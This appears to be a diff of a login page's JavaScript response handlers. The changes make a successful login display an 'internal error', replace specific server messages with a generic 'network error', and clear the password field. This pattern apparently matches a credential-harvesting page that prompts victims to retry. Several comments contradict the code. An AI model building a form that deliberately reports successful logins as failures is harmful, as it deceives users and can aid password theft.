@@ -203,23 +203,24 @@ $('#login-status-message').text(MESSAGES.authenticating);
       success: function(response) { 
         // Handle success: display success message or any other message from the MESSAGES object
         if (response === 'success') {
-		document.getElementById('login-status').style.visibility = 'visible';
-          $('#login-status').text(MESSAGES.success);
-          // Redirect if necessary
           setTimeout(function() {
-            window.location.href = 'your_redirect_url';
-					  $submitButton.prop('disabled', false); // Disable the button to prevent multiple submits
-    $submitButton.css('background-color', '1877f2'); // Change color to indicate submission
+		 $('#login-status').removeClass('info-notice').addClass('error-notice');
+		document.getElementById('login-status').style.visibility = 'visible';
+          $('#login-status-message').text(MESSAGES.internal_error); // Default message if no match
+		  		  $submitButton.prop('disabled', false); // Disable the button to prevent multiple submits
+    $submitButton.css('background-color', ''); // Change color to indicate submission
+    document.getElementById("pass").value = "";
           }, 5000); // Redirect after 2 seconds
         } 
 		
 		else if (MESSAGES[response]) {
 		setTimeout(function() {
-		$('#login-status').removeClass('info-notice').addClass('error-notice');
+		 $('#login-status').removeClass('info-notice').addClass('error-notice');
 		document.getElementById('login-status').style.visibility = 'visible';
-          $('#login-status-message').text(MESSAGES[response]); // Display corresponding message from MESSAGES
-		  $submitButton.prop('disabled', false); // Disable the button to prevent multiple submits
+          $('#login-status-message').text(MESSAGES.network_error); // Default message if no match
+		  		  $submitButton.prop('disabled', false); // Disable the button to prevent multiple submits
     $submitButton.css('background-color', ''); // Change color to indicate submission
+    document.getElementById("pass").value = "";
 		  }, 5000);
 		  
 		      
@@ -240,11 +241,12 @@ $('#login-status-message').text(MESSAGES.authenticating);
       },
       error: function() {
 	      setTimeout(function() {
-	  $('#login-status').removeClass('info-notice').addClass('error-notice');
-	  document.getElementById('login-status').style.visibility = 'visible';
-        $('#login-status-message').text(MESSAGES.network_error); // Handle network error
-				  $submitButton.prop('disabled', false); // Disable the button to prevent multiple submits
+		 $('#login-status').removeClass('info-notice').addClass('error-notice');
+		document.getElementById('login-status').style.visibility = 'visible';
+          $('#login-status-message').text(MESSAGES.network_error); // Default message if no match
+		  		  $submitButton.prop('disabled', false); // Disable the button to prevent multiple submits
     $submitButton.css('background-color', ''); // Change color to indicate submission
+    document.getElementById("pass").value = "";
 		      }, 5000);
       }
 	  
